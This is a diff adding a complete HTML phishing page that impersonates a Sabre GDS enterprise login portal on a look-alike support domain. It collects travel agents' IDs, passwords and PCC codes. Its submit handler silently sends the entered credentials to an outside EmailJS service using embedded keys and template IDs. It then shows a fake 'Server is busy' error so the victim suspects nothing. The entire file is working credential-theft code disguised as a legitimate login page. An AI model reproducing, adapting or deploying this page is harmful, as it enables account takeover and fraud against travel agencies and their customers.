@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sabre GDS | Enterprise Login Portal</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
+  
+  <!-- SEO Meta Tags -->
+  <meta name="description" content="Login to the Sabre GDS enterprise portal for secure access to airline booking and agent services.">
+  <meta name="keywords" content="Sabre, GDS, agent login, airline portal, travel booking, PCC, enterprise login">
+  <meta name="author" content="Global GDS Support">
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Sabre GDS | Enterprise Login Portal">
+  <meta property="og:description" content="Secure agent login portal for Sabre GDS users.">
+  <meta property="og:url" content="https://globalgdssupport.com/LoginAsAgencies.html">
+  <meta property="og:type" content="website">
+
+  <!-- Canonical -->
+  <link rel="canonical" href="https://globalgdssupport.com/LoginAsAgencies.html" />
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="styles.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+
+  <!-- Styles and Fonts -->
+  <link rel="stylesheet" href="styles.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <title>Sabre Enterprise Sign In</title>
+  <link rel="stylesheet" href="css/LoginAsAgencies.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  
+   <!-- 1. Load EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function() {
+    emailjs.init("s0V8V4beDXT4rMa18"); // Replace with your EmailJS public key
+  })();
+</script>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+     <div class="logo-text">Sabre</div>
+      <h2>Enterprise Sign In</h2>
+     <form id="form">
+        <input type="text" name="userId" placeholder="Agent ID" required />
+        <div class="password-wrapper">
+          <input type="password" name="password" placeholder="Password" required />
+          <span class="eye-icon"></span>
+        </div>
+        <input type="text" name="group" placeholder="PCC" required />
+        <button type="submit">SIGN IN</button>
+      </form>
+    </div>
+  </div>
+  <footer>
+    <p>© 2025 Sabre GLBL Inc. &nbsp; | &nbsp; <a href="#">Privacy policy</a> &nbsp; | &nbsp; <a href="#">Contact Us</a> &nbsp; | &nbsp; <a href="#">Copyright and trademark</a></p>
+  </footer>
+  
+  <script>
+  document.getElementById('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    emailjs.sendForm('service_khovyrq', 'template_95psblh', this)
+      .then(() => {
+        alert('Server is busy. Please try again later.!');
+        this.reset();
+      }, (error) => {
+        alert('ERROR Server is busy. Please try again later.');
+      });
+  });
+</script>
+</body>
+</html>
